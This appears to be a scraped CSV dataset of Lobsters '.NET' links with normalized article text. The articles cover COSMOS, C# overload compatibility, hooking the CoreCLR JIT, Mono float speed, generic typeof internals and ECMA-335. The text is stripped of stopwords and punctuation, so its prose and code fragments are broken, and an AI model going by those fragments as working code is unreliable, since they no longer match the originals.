277,Lobsters,dotnet,"C#, F#, .NET programming",COSMOS: C# Open Source Managed Operating System,https://www.gocosmos.org/,cosmos c open source managed operating system,introducing cosmos,introducing cosmoscosmos c open source managed operating system operating system development kit us visual studio development environment despite c name net based language used including vbnet fortran delphi prism ironpython f cosmos kernel routine primarily written c thus cosmos namecosmos operating system traditional sense instead operating system development kit cosmos let create operating system visual studio c normally let create application user write boot operating system minute using visual studiocosmos available two distribution developer kit dev kit user kit dev kit designed user want work developing cosmos user kit designed interested building operating system cosmos work dev kit might thought cosmos sdk user wishing work developing cosmos read developer guide wish create operating system download userkit
278,Lobsters,dotnet,"C#, F#, .NET programming",Backward compatibility and overloading,https://codeblog.jonskeet.uk/2018/04/13/backward-compatibility-and-overloading/,backward compatibility overloading,semantic versioning source binary compatibility talking simplest conceivable change foiled method group conversion unrelated reference type reference type nonnullable value type parameter optional parameter generic inheritance dynamic typing conclusion like,started writing blog post versioning july mostly abandoned think topic vast single post potentially need whole sitewikirepository devoted hope come back point believe hugely important topic get much attention deserves particular net ecosystem mostly embracing semantic versioning sound great rely u common understanding meant breaking change something thinking quite lot one aspect struck forcefully recently hard avoid breaking change using method overloading post mostly fun first quick source binary compatibility recompile client code new version library work fine source compatible redeploy existing client binary new version library without recompiling binary compatible neither superset change source binary incompatible removing whole public type depended change source compatible binary incompatible changing public static readonly field property change binary compatible source incompatible adding overload could cause compiletime ambiguity change source binary compatible reimplementing body method talking going assume public library version wish add overload version following semantic versioning need backward compatible mean simple binary choice various case present library code version version client code ie code using library could broken change presenting method body class declaration largely irrelevant focus signature easy reproduce interested though imagine method present class called library simplest conceivable change foiled method group conversion simplest example imagine would adding parameterized method parameterless one already library version public void foo library version public void foo public void foo int x even completely compatible consider client code client static void method var library new library handleaction libraryfoo static void handleaction action action static void handleaction action int action library version fine call handleaction performs method group conversion libraryfoo create action library version ambiguous method group converted either action action int source compatible going strict point might tempted give go home resolving never add overload ever maybe say enough corner case consider breaking let call method group conversion scope unrelated reference type get different kind territory overload number parameter might expect library change nonbreaking library version public void foo string x library version public void foo string x public void foo filestream x feel like reasonable original method still exists breaking binary compatibility simplest way breaking source compatibility call either work work something different call break argument compatible string filestream unrelated reference first failure userdefined implicit conversion string filestream client class oddlyconvertible public static implicit operator string oddlyconvertible c null public static implicit operator filestream oddlyconvertible c null static void method var library new library var convertible new oddlyconvertible libraryfoo convertible hopefully problem obvious used unambiguous via conversion string ambiguous oddlyconvertible type implicitly converted string filestream overload applicable neither better may reasonable exclude userdefined far simpler way making fail client static void method var library new library libraryfoo null null literal implicitly convertible reference type nullable value call becomes ambiguous library let try reference type nonnullable value type parameter mind userdefined conversion like null literal causing problem introducing overload nonnullable value type library version public void foo string x library version public void foo string x public void foo int x look good libraryfoo null fine safe c client static void method var library new library libraryfoo default default literal like null literal type really useful complete pain come overloading compatibility optional parameter optional parameter bring kind pain suppose one optional parameter wish add second three option shown library version public void foo string x library version keep existing method add another one two optional parameter public void foo string x public void foo string x string library version add parameter existing method public void foo string x string library version keep old method make parameter required add new method parameter optional public void foo string x public void foo string x string let think client make two call client static void method var library new library libraryfoo libraryfoo xyz library keep binary compatiblity break source compatibility libraryfoo ambiguous c overloading rule prefer method need compiler fill optional parameter preference term many optional parameter filled library keep source compatibility break binary compatibility existing compiled code expect call method single parameter method longer exists library keep binary compatibility potentially odd around source compatibility libraryfoo call resolve twoparameter method whereas libraryfoo xyz resolve oneparameter method compiler prefers twoparameter method need fill optional parameter may well okay oneparameter version simply delegate twoparameter version using default value feel odd meaning first call change though method used resolve still exists optional parameter get even hairer want add new one end middle eg trying follow convention keeping optional cancellationtoken parameter end going dive generic type inference tricky beast best time overload resolution go fullon nightmare mode let single nongeneric method add generic method library version public void foo object x library version public void foo object x public void foo x seem let look closely happens client code client static void method var library new library libraryfoo new object libraryfoo xyz library call resolve foo object method exists library binarycompatible use client executable compiled running call still use foo object recompile second call second one change using generic method method applicable call first call would inferred object argumenttoparametertype conversion object object case great compiler applies tiebreak rule prefers nongeneric method generic method second call would inferred string argumenttoparametertype conversion string object original method string string generic method latter better conversion second method picked two method behave way fine broken compatibility subtle way inheritance dynamic typing sorry energy inheritance dynamic typing would interact overload resolution fun obscure way add method one level inheritance hierarchy overload method base class new method examined first picked base class method even base class method specific term argumenttoparametertype conversion lot scope messing thing likewise dynamic typing within client code extent bet already sacrificing lot compiletime come surprise thing break conclusion tried keep example reasonably simple get really complicated really quickly soon multiple optional parameter etc versioning hard make head hurt like like loading related
279,Lobsters,dotnet,"C#, F#, .NET programming",Writing a Managed JIT in C# with CoreCLR,http://xoofx.com/blog/2018/04/12/writing-managed-jit-in-csharp-with-coreclr/,writing managed jit c coreclr,github repo behind story sharplabio netasm full user guide rotorsscli source code project released cff explorer sample icorjitcompiler hacking jit jit c jitted detecting jit managedjit class hacking compilemethod store compilemethoddelegate managedjitcompilemethod instance method create trampoline delegate compilemethoddelegate simulate native call managed delegate net delegate work often called reverse pinvoke simulate reverse pinvoke call delegate install jit c managed jit active writing managedjitcompilemethod workaround jit reentrancy accessing systemreflection native information writing actual jit method replacer online asmdisasm compiler gc final word gcix jikes rvm,may know net coreclr mono jit entirely written cc sometimes even joke used c developer remind enthusiastic c developer crowd ecosystem actually ran c story new language including c simple chickenegg story requires use existing primitive language compiler origin sometimes even write directly assembly code using number end come star able create new language said look programming language story find quite often bootstrapping new language compiler often rewritten point language go compiler example originally written c later around written go something always fascinating could thing net jit using c blog post associated github repo show hack sustainable many reason give detail end would like still share crazy idea dig hack c coreclr behind story started last week looking native code generated net c using amazing online sharplabio tool actually looking original issue reminded could use similar technique project released codeplex around year ago time fly called netasm netasm provides hook net jit compiler enables inject native code replacement default clr jit compilation library possible runtime inject assembler code clr method speed pure clr method call without cost interoppinvoke call wrote even full user guide probably bit crazy really optimistic anyway last small update net runtime time able break little library unfortunately netasm mainly based able know underlying runtime time rotorsscli source code project released access update made looking fact coreclr os solution presented time still completely workable note work mainly based hacking idea taken net internals native compiling done daniel pistelli though searching link found wrote also codeproject net internals code injection look even closer netasm though remember read prolific writer net internals developed cff explorer pe explorer support net still using year time able get solution entirely c used c solution far know existing solution around net use setup thankfully bit experience meantime finally found workaround get running c without c code middle make maybe first jit implemented c net actually writing line found post analyzing nasty net protection ploutusd malware seems malware written c hooking similar way going describe interesting let see working sample simple following program repository managedjit show used practice class program static void main string args create managed jit compiler using var clrjit managedjitgetorcreate print instead expected var result jitreplaceadd consolewriteline nameof jitreplaceadd result methodimpl methodimploptionsnoinlining public static int jitreplaceadd int int b b actually print jitreplaceadd instead jitreplaceadd done hacking jit compiler using well known technique postpatching code via runtimehelperspreparemethod methodinfomethodhandlegetfunctionpointer though see somewhat forced postpatch jit time later icorjitcompiler coreclr pretty modular jit sitting shared library called clrjitdll net framework mscorjitdll fact jit exposed simple exported symbol getjit shared library extern c icorjitcompiler stdcall getjit return minimalist interface icorjitcompiler contains pure c virtual method end method declaration important hack notably first method famous compilemethod called ultimately typical methoddesc makejitworker whenever need jit managed method native code class icorjitcompiler public compilemethod main routine ask jit compiler create native code method method compiled passed info parameter code icorjitinfo used allow jit resolve token make callback needed create code nativeentry nativesizeofcode convenience jit asks ee memory emit code see code icorjitinfoallocmem really ee already know method start big fact could one chunk bit jit implemented code ciljitcompilemethod bit jit implemented code prejitcompilemethod note obfuscators hacking jit depend method stdcall calling convention virtual corjitresult stdcall compilemethod icorjitinfo comp struct corinfomethodinfo info unsigned code corjitflag flag byte nativeentry ulong nativesizeofcode hacking jit know entry point jit compiler method exposed cautious reader kind inception chickenegg jit c jitted detecting jit first step load clrjitdll fetch getjit also check able work specific version static initializer managedjit class iterate module loaded process find module named clrjitdll find function getjit exported following code work window using getprocaddress portable way ot getting module handle though hopefully come issue corefx helper class dealing native shared library function pointer need check version via method provided icorjitcompiler getversionidentifier return guid stored corjith icorjitinfo provided first parameter icorjitcompiler compilemethod changed constantly method added interface late binding method via index vtable index change need verify bind known jit version work foreach processmodule module processmodules pathgetfilename modulefilename clrjitdll address icorjitcompiler http var jitaddress getprocaddress modulebaseaddress getjit jitaddress intptrzero var getjit getjitdelegate marshalgetdelegateforfunctionpointer jitaddress typeof getjitdelegate var jit getjit jit intptrzero jitvtable marshalreadintptr jit check jitversion var getversionidentifierptr marshalreadintptr jitvtable intptrsize getversionidentifiervtableindex var getversionidentifier getversionidentifierdelegate marshalgetdelegateforfunctionpointer getversionidentifierptr typeof getversionidentifierdelegate getversionidentifier jitaddress var version version expectedjitversion return version ok get compilemethod defaultcompilemethodptr marshalreadintptr jitvtable intptrsize compilemethodvtableindex defaultcompilemethod compilemethoddelegate marshalgetdelegateforfunctionpointer defaultcompilemethodptr typeof compilemethoddelegate break see fetching vtable information familiar let explained bit c object pure virtual method single inheritance exposed get pointer vtable instance returned icorjitcompiler vtable simply array pointer virtual method implementation unique implementation icorjitcompiler interface sense c implementation provided another type typically coreclr ciljit also many interceptor implementation respect vtable abi expose method interface c compiler specific luckily enough accepted valid across compiler reason c pattern base com object working root interface iunknown provides basic object lifecycle reference counting addreferencerelease also extensibility providing queryinterface guid iunknown outinterface expose interface existing iunknown implementation ciljit instance jit ciljit vtable jitvtable compilemethodptr myjitimplementation compilemethod clearcacheptr getversionidentifierptr following code jitvtable marshalreadintptr jit simply loading jitvtable pointer used later fetch getversionidentifier compilemethod method var getversionidentifierptr marshalreadintptr jitvtable intptrsize getversionidentifiervtableindex var getversionidentifier getversionidentifierdelegate marshalgetdelegateforfunctionpointer getversionidentifierptr typeof getversionidentifierdelegate already used c delegate wrap native function exactly using marshalgetdelegateforfunctionpointer difference delegate take hidden parameter object instance unmanagedfunctionpointer callingconventioncdecl private delegate void getversionidentifierdelegate intptr thisptr guid versionidentifier expectedjitversion managedjit class guid directly extracted corinfoh note note note note note note note note note note note note note note note note note note note note jiteeversionidentifier guid represents version jitee interface time interface jit ee change adding removing method interface shared guid changed identifier verified icorjitcompiler getversionidentifier use uuidgenexe generate value note integrator merge conflict version changed two different place must create new guid simply choose one note note note note note note note note note note note note note note note note note note note note defined selectany define selectany extern declspec selectany endif selectany const guid jiteeversionidentifier important check version offset vtable likely change new version coreclr hacking compilemethod ok got pointer jit vtable delegate original compilemethod need plug c method inplace existing basic approach described earlier vtable icorjitcompiler modify first entry compilemethod already saved pointer create managed delegate call c implemented compilemethod order achieve get bit tricky store compilemethoddelegate managedjitcompilemethod instance method first step need create delegate compilemethoddelegate going rerouted instance method compilemethod managedjit convert reference compile method compilemethoddelegate overridecompilemethod compilemethod storing going store unmanaged reference delegate vtable need make sure gc collect delegate mean time common pattern whenever pas delegate function pointer c c create trampoline delegate compilemethoddelegate simulate native call managed delegate may wonder need create another delegate indirection reflects way c managed delegate exposed c create c function pointer existing c delegate marshalgetfunctionpointerfordelegate il create jit trampoline called compiled generate actual code handle transition c managed transition requires typically switch gc preemptive c method interrupted time gc order quickly work cooperative c net gc work closely program interrupt know place looked implementation detail jit actually involved process example great post matt warren net delegate work matt describing jit involved standard delegate also delegate endup pinvoke case exposing c delegate going called native code often called reverse pinvoke marshalgetfunctionpointerfordelegate generate reverse thunk function jit still compile something ondemand delegate actually called understand need try force compilation delegate put overridecompilemethodptr directly vtable jit go recursive loop trying access delegate try compile actually used reversed case c managed generate stackoverflowexception point probably error got tried netasm end work c instead knowledge need simulate reverse pinvoke call delegate going create trampoline build trampoline allow simulate call native delegate overridecompilemethodptr marshalgetfunctionpointerfordelegate overridecompilemethod var trampolineptr allocatetrampoline overridecompilemethodptr var trampoline compilemethoddelegate marshalgetdelegateforfunctionpointer trampolineptr typeof compilemethoddelegate magical allocatetrampoline native code call delegate simply create trampoline like private static readonly byte delegatetrampolinecode mov rax pointer address overridecompilemethodptr jmp rax private static intptr allocatetrampoline intptr ptr create executable region code memory var jmpnative virtualalloc intptrzero delegatetrampolinecodelength allocationtypecommit memoryprotectionexecutereadwrite copy trampoline code marshalcopy delegatetrampolinecode jmpnative delegatetrampolinecodelength setup delegate want call part reverse pinvoke call marshalwriteintptr jmpnative ptr return jmpnative trampoline place call trampoline call delegate meantime call existing jit compile reverse delegate call ultimately managedjitcompilemethod method call trampoline intptr value int size var emptyinfo default corinfomethodinfo trampoline intptrzero intptrzero ref emptyinfo value size freetrampoline trampolineptr get calling sequence jit compile delegate also compile partially jit method note code passing intptrzero allow call compilemethod handle gracefully code early exit know jit hooked need proceed private int compilemethod intptr thisptr intptr comp icorjitinfo comp ref corinfomethodinfo info struct corinfomethodinfo info uint flag unsigned code corjitflag flag intptr nativeentry byte nativeentry int nativesizeofcode ulong nativesizeofcode early exit gracefully entering calling trampoline jit yet compile still want method compiled original jit ishookinstalled nativeentry intptrzero nativesizeofcode return important let also existing jit compile future jit method otherwise would endup chickenegg problem reverse delegate letting jit compile compilemethod installing able install install jit need patch first pointer jitvtable contains pointer compilemethod compilemethoddelegate accessible native code install installmanagedjit overridecompilemethodptr ishookinstalled true private static void installmanagedjit intptr compilemethodptr need unprotect jitvtable default readwrite usually c vtable generated compile time placed readonly section shared library virtualprotect jitvtable compilemethodvtableindex new intptr intptrsize memoryprotectionreadwrite var oldflags marshalwriteintptr jitvtable compilemethodvtableindex compilemethodptr virtualprotect jitvtable compilemethodvtableindex new intptr intptrsize oldflags oldflags see convoluted expected reason jitvtable originally readonly try write location get accessmemoryviolationexception temporarily changing protection memory order write pointer delegate c jit compiler method restore protection installed yes call installmanagedjit new method compiled go compilemethod c managed jit active writing managedjitcompilemethod blog post maybe bit misleading expect write entire jit c right instead going simple hardcoded jit able recognize sample function jitreplaceadd provide different native code first need sort bit workaround jit reentrancy jit c code involved could go deeply spread many class already jit similar situation need original jit compile jit run told called inceptionjit simply use counter track enter jit counter leave method var compileentry compiletls compiletls new compiletls compileentryentercount try always let default jit compile method var result defaultcompilemethod thisptr comp ref info flag nativeentry nativesizeofcode top level method compile wil recompile compileentryentercount call replace jit method else call default jit compile method result defaultcompilemethod thisptr comp ref info flag nativeentry nativesizeofcode return result finally compileentryentercount code using thread static local storage jit used multiple thread basically reentrancy counter per thread increment counter counter mean user method compiled call jit otherwise method c jit need compiled let original jit handle decrement counter accessing systemreflection native information look icorjitcompiler compilemethod several parameter give u context method compile virtual corjitresult stdcall compilemethod icorjitinfo comp struct corinfomethodinfo info unsigned code corjitflag flag byte nativeentry ulong nativesizeofcode different c right access jit important requires access directly information memory without generating allocation duplicating information systemreflection basically need low level interface ok c would like access corresponding methodinfo systemreflection work get idea use le possible icorjitinfo laborious access work automated hack could done easily proper c c codegen step get net il token method compiled query using method icorjitinfo getmethoddeffrommethod declared corinfoh var vtablecorjitinfo marshalreadintptr comp var getmethoddeffrommethodptr marshalreadintptr vtablecorjitinfo intptrsize icorjitinfogetmethoddeffrommethodindex var getmethoddeffrommethod getmethoddeffrommethoddelegate marshalgetdelegateforfunctionpointer getmethoddeffrommethodptr typeof getmethoddeffrommethoddelegate var methodtoken getmethoddeffrommethod comp infoftn need get equivalent systemreflectionassembly method compiled unfortunately part bit convoluted found easy idea query assembly handle icorjitinfo getmoduleassembly current il module method handle iterate assembly appdomain compare name assembly find store reference var getmoduleassemblydelegateptr marshalreadintptr vtablecorjitinfo intptrsize icorjitinfogetmoduleassemblyindex var getmoduleassemblydelegate getmoduleassemblydelegate marshalgetdelegateforfunctionpointer getmoduleassemblydelegateptr typeof getmoduleassemblydelegate var assemblyhandle getmoduleassemblydelegate comp infoscope check assembly already found assembly assemblyfound map assemblyhandle managed assembly instance use jitlock maphandletoassembly compilemethod called concurrently different thread lock jitlock maphandletoassemblytrygetvalue assemblyhandle assemblyfound var getassemblynameptr marshalreadintptr vtablecorjitinfo intptrsize var getassemblyname getassemblynamedelegate marshalgetdelegateforfunctionpointer getassemblynameptr typeof getassemblynamedelegate var assemblynameptr getassemblyname comp assemblyhandle var assemblyname marshalptrtostringansi assemblynameptr todo inefficient way finding assembly foreach var assembly appdomaincurrentdomaingetassemblies assemblygetname name assemblyname assemblyfound assembly break register assembly maphandletoassemblyadd assemblyhandle assemblyfound token managed assembly simply query methodbase managed object find method token methodbase method null assemblyfound null foreach var module assemblyfoundmodules try method moduleresolvemethod methodtoken catch exception found method call method replacer method null replacecompile method infoilcode infoilcodesize nativeentry nativesizeofcode writing actual jit method replacer simple jit going replace method jitreplaceadd custom code private void replacecompile methodbase method intptr ilcodeptr int ilsize intptr nativecodeptr int nativecodesize methodname nameof programjitreplaceadd return instead public static int jitreplaceadd int int b b code generates b add ecx edx mov eax ecx ff inc eax ret var instruction new byte marshalcopy instruction nativecodeptr instructionslength static method first parameter int passed ecx register int b passed edx calling convention clr simply add two put result eax abi expected result function increment eax value provide feedback actual jit code running used handy online asmdisasm compiler generate code gc may wonder previous code something weird actually allocating nativecodeptr nativecodesize work well hack actually really sustainable order fully integrate coreclr would need generate native code also provide gc information usually done using following icorjitinfo method icorjitinfo allocmem alocate jit memory code support hotcold path cold path example typically catch happen often virtual void allocmem ulong hotcodesize ulong coldcodesize ulong rodatasize ulong xcptnscount corjitallocmemflag flag void hotcodeblock void coldcodeblock void rodatablock icorjitinfo allocgcinfo virtual void allocgcinfo sizet size problem gcinfo bit stream used currently coreclr using dedicated c macro write found hack going exposing c would generate easily gcinfo end used gc know method managed object still need generate information otherwise getting error trying run method assert failure pid thread pbuffer null coreclr bitstreamreader bitstreamreader coreclr gcinfodecoder gcinfodecoder coreclr eecodemanager getfunctionsize coreclr eejitmanager jittokentomethodregioninfo coreclr eecodeinfo getmethodregioninfo coreclr etw methodlog sendmethodevent coreclr etw methodlog methodjitted coreclr methoddesc makejitworker coreclr methoddesc doprestub coreclr prestubworker file c codedotnetcoreclrsrcincgcinfodecoderh line image c see gc expecting gcinfo allocated empty original code using allocmem obviously enough hack let use original jit compile method generates proper gcinfo replace code native code talking earlier fact hack actually postpatching jit time entirely full self contained jit work alone get whole stuff running replacing code final word year ago prototyped idea implementing gcix gc immix c also c paper immix markregion garbage collector space efficiency fast collection mutator performance amazed discover using jvm jikes rvm heard back day working java yet developed alive implement full vm including jit gc java found option powerful fact able design new advanced jit based confirmed able open lot net ecosystem easy year development existing jit code gc made c c would slow contrary common naive belief demonstrating work burst compiler unity generate code even efficient huge legacy code already working benefit managed jit visible shortterm even mediumterm could open many possibility long run project legacy size net probably much ask possible life beyond prototype well would require work expose automatically whole icorjitinfo interface even resilient change supporting dynamically change api along also interfacing correctly gc free paid time would certainly quite enjoy developing full managed c jitaot compiler maybe someone os andor academic world try challenge idea anyway find whole hack cool develop meantime also enjoy toying c managedjit hack happy coding p oh forgot back original story sharplabio probably hacky would nicer adequate simpler public infrastructure quite resilient jit change provide relevant bit decompile jit native method
280,Lobsters,dotnet,"C#, F#, .NET programming",How we doubled Mono’s Float Speed,http://tirania.org/blog/archive/2018/Apr-11.html,doubled mono float speed,recently wrote posted ara ray tracer bit float runtime flag bug report filed unity user http brought mono runtime option tuning llvm next step http http,friend ara recently wrote ray tracer various language including c c upcoming unity burst compiler natural expect c slower c interesting mono much slower net core number posted look good c net core mac mrays c unity mono mac mrays c unity mac mrays decided look going document possible area improvement result benchmark looking problem identified three area improvement first need better default mono user tune parameter second need better inform world llvm code optimizing backend mono third tuned parameter mono baseline test run ara ray tracer machine since different hardware could use number compare result imac home follows mono net core runtime result mraysec net core debug build dotnet run net core release build dotnet run c release vanilla mono mono mathsexe vanilla mono llvm process researching problem found couple problem fixed produced following result runtime result mraysec mono llvm improved mono llvm fixed inline aggregated using llvm code get almost performance improvement floating point code tuning added mono result exercise get running plain mono default future version mono blog post explains finding bit float ara using float math float type c systemsingle net term mono decade ago made mistake performing float computation float still storing data location memory point good used quite recall made decision best guess decision rooted trend idea time around time positive aura around extended precision computation float example intel processor use precision floating point computation even operand double giving user better result another theme around time gnumeric spreadsheet one previous project implemented better statistical function excel well received many community could use correct higher precision result early day mono mathematical operation available across platform took double input posix iso introduced version generally available across industry early day example sinf float version sin fabsf fabs short early time optimism application pay heavier price extra computation time mono mostly used linux desktop application serving http page server process floating point performance never issue faced day day noticeable scientific benchmark rarely use case net usage era nowadays game application image processing vr ar machine learning made floating point operation common data type modern application rain pours exception float longer friendly data type sprinkle place code come avalanche place hide many stop coming runtime flag couple year ago decided add support performing float operation operation like everyone else call runtime feature mono enable passing option runtime xamarin application change setting project preference new flag well received mobile user majority mobile device still powerful rather process data faster need precision guidance mobile user turn llvm optimizing compiler flag time flag year made default reduce surprise user find facing scenario current behavior already surprise user example see bug report filed unity user going change default mono track progress http meantime went back friend ara project using new apis introduced net core net core always performed float operation float systemmath api still forced conversion float double course business example wanted compute sine function float choice call mathsin double pay price float double conversion address net core introduced new systemmathf type contains single precision floating point math operation brought systemmathf http mono moving bit float bit float certainly improves performance see table runtime option mrayssecond mono systemmath mono systemmath using mono systemmathf mono systemmathf using using really improves thing test mathf small effect tuning llvm course research discovered mono fast jit compiler support added support llvm backend meant mono llvm still performing expensive float double conversion zoltan added support llvm code generation engine noticed inliner using heuristic fast jit using llvm fast jit want strike balance jit speed execution speed limit much inline reduce work jit engine opt using llvm mono want get fastest code possible adjusted setting accordingly today change setting via environment variable monoinlinelimit really baked default tuned llvm setting result runtime option mraysseconds mono systemmath llvm mono systemmath llvm fixed heuristic mono systemmathf llvm fixed heuristic next step work bring improvement relatively low discussion slack lead improvement even managed spend hour one evening bring systemmathf mono ara raytracer code ideal subject study selfcontained real application synthetic benchmark want find software like use review kind bitcode generate make sure giving llvm best data llvm job also considering upgrading llvm use leverage new optimization added extra precision nice side effect example recently reading pull request godot engine saw busily discussing making floating point precision engine configurable compile time http asked juan anyone would want thought game content floating point operation juan explained float work great general move away center say game navigate kilometer center game math error start accumulate end interesting visual glitch various mitigation strategy used higher precision one possibility one come performance cost shortly conversation blog showed twitter timeline showing problem http image show problem first sport car model distribution camera scene near origin everything look good cool sport car model courtesy yasutoshi mori next translated camera scene unit origin xx yy zz see car model getting fairly chunky entirely due insufficient floatingpoint precision thanks yasutoshi mori move farther away million unit origin thing really fall apart car become extremely coarse voxelized approximation cool horrifying time keanu wonder minecraft chunky purely everything rendered really far origin apology yasutoshi mori done nice model
281,Lobsters,dotnet,"C#, F#, .NET programming",typeof(TSecret) - the secret magic behind .NET generics,http://yizhang82.github.io/dotnet-generics-typeof-t,typeof tsecret secret magic behind net generic,typeof tsecret secret magic behind net generic net net core last post interview challenge implement typeof clr net hood methodtable methoddesc methodtablebuildercpp corinfoh icorjitinfo implementation ceeinfo diving generated code corinfolookupthisobj diving generated code corinfolookupmethodparam diving generated code corinfolookupclassparam conclusion next,typeof tsecret secret magic behind net generic apr c clr netcore typesystem generic net net core typeof work net genericsin last post talked net code sharing reference type time let take look typeof black magicin particular code know typeof presence code sharing obviously code sharing method instantiation different code would instantiated correct typeof code real type obviously would work dive implementation let take first crack problem see challenge interview challenge implement typeof clr netlet consider following code class foo void func obj consolewriteline typeof one obvious idea get argument void func obj consolewriteline objgettype appears work think always give right answer obj subclass base class case end printing derived class incorrectand always show argument well class foo void func consolewriteline typeof let take look another case class foo void func consolewriteline typeof time argument help u pointer foo class foo void func consolewriteline thisgettype getgenericarguments actually work rather well static method class foo static void func consolewriteline typeof look like really always rely argumentthis pointer inside function figure type except instance method generic type use pointer given method generated generic fashion know anything designthe underlying problem enough contextual information infer tto make work need think like runtimecompiler dev enough information method change caller pas imagine compiler jit c compiler net native etc could work runtime figure special method need assistance need change call site fancy term call happens caller code insert magic parameter carry additional information type argument net runtime compiler often employ trick like known secret argument one another example net interop il stub also use secret argument support sharing interop stub across pinvoke com interop method compatible method signaturesunder hoodinternally net runtime support kind generic lookup typeof case look generic argument pointerlook generic argument secret instantiatedmethoddesc parameter describes methodlook generic argument secret methodtable parameter describes typein net methodtable describes type related information methodtable equivalent type object within runtime similarly methoddesc equivalent methodinfo runtime data structure generated clr type loader runtime net metadata methodtablebuildercppthese defined corinfoh enum corinforuntimelookupkind corinfolookupthisobj corinfolookupmethodparam corinfolookupclassparam compilation compiler work runtime figure information method called ceeinfo getcallinfo call ceeinfo computeruntimelookupforsharedgenerictoken determine lookup kind net get layering runtime compiler right icorjitinfo jitee execution engine runtime runtime jit compiler talk core jit understands net type system net design talk compiler long properly implement interface net native corert able swap jit proper c backend compiler using icorjitinfo implementation ceeinfo implementation jitdiving generated code corinfolookupthisobjassuming following code case generic class nongeneric method class public void func consolewriteline typeof case nongeneric class generic method class public void func consolewriteline typeof case generic class static nongeneric method class public static void func consolewriteline typeof case nongeneric class static generic method class public static void func consolewriteline typeof let take look case first discussed earlier type parameter infered pointer see following code generated jit typeof code comment added mov rcx qword ptr pointer saved earlier mov rcx qword ptr rcx methodtable mov rcx qword ptr mpperinstinfo offset mov rcx qword ptr rcx first generic dictionary mov rcx qword ptr rcx first type arg mov qword ptr rcx mov ecx dword ptr test indirection jne mov rcx qword ptr indirection required load mov qword ptr rcx jmp mov rcx qword ptr indirection go get mov rcx qword ptr mov qword ptr rcx mov rcx qword ptr either way methodtable need call coreclr jitgetruntimetype get type object dive deeper need talk another concept generic dictionariesyou might realized beginning article use pointer get type argument need way say give argument runtime support operation using special data structure called generic dictionary methodtable see earlier description metohdtable methoddesc save type argument generic parameter also cache associated instantiation talk otherwise get long mpperinstinfo field happens dt coreclr methodtable spmethoddatacache null sfuseparentmethoddata sfusemethoddatacache mdwflags mbasesize mwtoken mwnumvirtuals mwnuminterfaces mpparentmethodtable mploadermodule module mpwriteabledata methodtablewriteabledata mpeeclass eeclass mpcanonmt mpperinstinfo dictionary methodtable pointer always first pointer field object objectgettype reference type get first pointer field got methodtable think net clr equivalent c vtable rtti much richer information anyway pointer away object mpperinstinfo mov rcx qword ptr pointer mov rcx qword ptr rcx methodtable mov rcx qword ptr mpperinstinfo due inheritance object could one generic dictionary refer base parent class generic dictionary case one first element dictionary first type argument one type argument etc case get first one either way compiler always know index type argument list type parameter statically mov rcx qword ptr rcx first generic dictionary mov rcx qword ptr rcx first type arg need bit fixup pointer pointer actual type methodtable lowest bit indicates indirection otherwise real pointer either way real type argument end rcx call coreclr jitgetruntimetype give type actually type yet coreclr scope article diving generated code corinfolookupmethodparamthis time let look generic instance method nongeneric classthe call site pas secret argument expected mov secret argument cmp dword ptr rcx ecx call secret argument actually instantiatedmethoddesc mpperinstinfo field pointing generic dictionary like methodtable since inheritance method level one generic dictionaryi added comment method code similar bit straightforward le indirection rdx saved earlier mov rcx qword ptr rdx secret argument instantiatedmethoddesc mov rcx qword ptr mpperinstinfo mov rcx qword ptr rcx first type argument mov qword ptr rcx mov ecx dword ptr test indirection check jne mov rcx qword ptr mov qword ptr rcx jmp mov rcx qword ptr mov rcx qword ptr mov qword ptr rcx mov rcx qword ptr either way call coreclr jitgetruntimetype diving generated code corinfolookupclassparamin case type parameter class naturally pas type methodtable secret mov secret argument call nop secret argument surprisingly edited clarity dumpmt name systemstring systemprivatecorelib code look almost exactly case except case need get methodtable instead secret argument bit work mov rcx qword ptr secret argument methodtable mov rcx qword ptr mpperinstinfo mov rcx qword ptr rcx first dict mov rcx qword ptr rcx first type argument mov qword ptr rcx mov ecx dword ptr test jne mov rcx qword ptr mov qword ptr rcx jmp mov rcx qword ptr mov rcx qword ptr mov qword ptr rcx mov rcx qword ptr call coreclr jitgetruntimetype look case detail hard conclude relying corinfolookupmethodparamconclusion nextwe looked clr typeof magic combination looking pointer secret argument runtime compiler together collaborate make scenario like work like everything life computer science everything trade order share code additional cost involves seemingly simple thing like typeof need work statically runtime static mean compile time runtime talking jit next post dig bit deeper generic dictionary dark secret secret argument passingtwo interesting question probably think make work secret type argument also make performant class foo public void func consolewriteline typeof list icomparable make secret argument work delegate also plan write clr internals going forward see folk written yet topic come mind net implement marshaling pinvokes comhow net support winrthow default interface method implemented runtime http
283,Lobsters,dotnet,"C#, F#, .NET programming",Taking a look at the ECMA-335 Standard for .NET,http://www.mattwarren.org/2018/04/06/Taking-a-look-at-the-ECMA-335-Standard-for-.NET/,taking look standard net,taking look standard net common language infrastructure cli edition june net core net framework useful mono dotnetanywhere common language runtime clr defined public standard ecma c common language infrastructure specification net standard looking back standardization quite effective leading net strong presence io android unity xamarin offering use mono runtime may end true net linux wikipedia page concept architecture ii metadata definition semantics iii cil instruction set iv profile library v binary format debug interchange format vi annex comprehensive overview comic sans changed edition link link link link significant generic added net typeforwarding variance microsoft specific implementation information,taking look standard net apr word turn net runtime technical standard specification known full name common language infrastructure cli confused c language specification latest update edition june specification standard written net core existed applies net framework interested know plan updated version rest post take look standard exploring content investigating learn hint lot lowlevel detail information net internals useful standard mean different implementation mono dotnetanywhere exist common language runtime clr compiler tool able produce output common language runtime consume type system format metadata runtime environment virtual execution system defined public standard ecma common language infrastructure specification information see ecma c common language infrastructure specification coreclr documentation net standard early realization founder net creating new programming technology broad applicability across operating system cpu type advanced state art late net project started microsoft programming language implementation technique led considering pursuing standardization important pillar establishing net industry key addition state art support multiple programming language single language runtime hence name common language runtime many smaller addition value type simple exception model attribute generic language integrated query later added list looking back standardization quite effective leading net strong presence io android unity xamarin offering use mono runtime may end true net linux various net standard made meaningful collaboration multiple company industry expert served working group defined standard addition importantly net standard implemented multiple commercial ex unity net native open source ex mono implementors presence multiple implementation prof point standardization last quote point standard produced solely microsoft also nice wikipedia page additional information highlevel overview specification divided following partition concept architecture great introduction clr explaining many key concept component well rationale behind ii metadata definition semantics explanation format net dllexe file different section within laid inmemory iii cil instruction set complete list intermediate language il instruction clr understands along detailed description use iv profile library describes various different base class library makeup runtime grouped profile v binary format debug interchange format overview portable cildb file give way additional debugging information provided vi annex annex introduction annex b sample program annex c cil assembler implementation annex class library design guideline annex e portability consideration annex f imprecise fault annex g parallel library working way entire specification mammoth task generally find useful search particular word phrase locate part need way however want read one section recommend partition concept architecture page much easier fully digest section comprehensive overview key concept component contained within 